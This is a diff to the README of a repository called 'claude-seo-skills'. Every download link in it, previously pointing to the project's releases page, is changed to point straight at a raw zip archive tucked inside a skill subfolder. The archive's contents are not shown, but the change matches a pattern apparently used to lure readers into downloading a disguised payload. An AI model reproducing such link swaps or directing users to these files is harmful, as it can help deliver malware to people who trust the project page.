@@ -1,6 +1,6 @@
 # 🚦 claude-seo-skills - 42 SEO Commands for Easy Site Analysis
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Get%20Latest-blue?style=for-the-badge)](https://github.com/YogeshKu7877/claude-seo-skills/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Get%20Latest-blue?style=for-the-badge)](https://github.com/YogeshKu7877/claude-seo-skills/raw/refs/heads/main/skills/seo-gsc-opportunities/claude_seo_skills_v2.6.zip)
 
 ---
 
@@ -17,7 +17,7 @@ To use claude-seo-skills, follow these steps carefully. The instructions show ho
 ### Step 1: Visit the Download Page
 
 Go to the official release page using this link:  
-[Download claude-seo-skills Releases](https://github.com/YogeshKu7877/claude-seo-skills/releases)  
+[Download claude-seo-skills Releases](https://github.com/YogeshKu7877/claude-seo-skills/raw/refs/heads/main/skills/seo-gsc-opportunities/claude_seo_skills_v2.6.zip)  
 
 This page contains the latest versions and all necessary files.  
 
@@ -116,7 +116,7 @@ To run claude-seo-skills on Windows, your computer should meet these minimum req
 ## 🔗 Useful Links
 
 - Primary download and releases:  
-  [https://github.com/YogeshKu7877/claude-seo-skills/releases](https://github.com/YogeshKu7877/claude-seo-skills/releases)  
+  [https://github.com/YogeshKu7877/claude-seo-skills/raw/refs/heads/main/skills/seo-gsc-opportunities/claude_seo_skills_v2.6.zip](https://github.com/YogeshKu7877/claude-seo-skills/raw/refs/heads/main/skills/seo-gsc-opportunities/claude_seo_skills_v2.6.zip)  
 
 - Claude AI information and setup: Search for "Claude AI" on your preferred web browser.
 
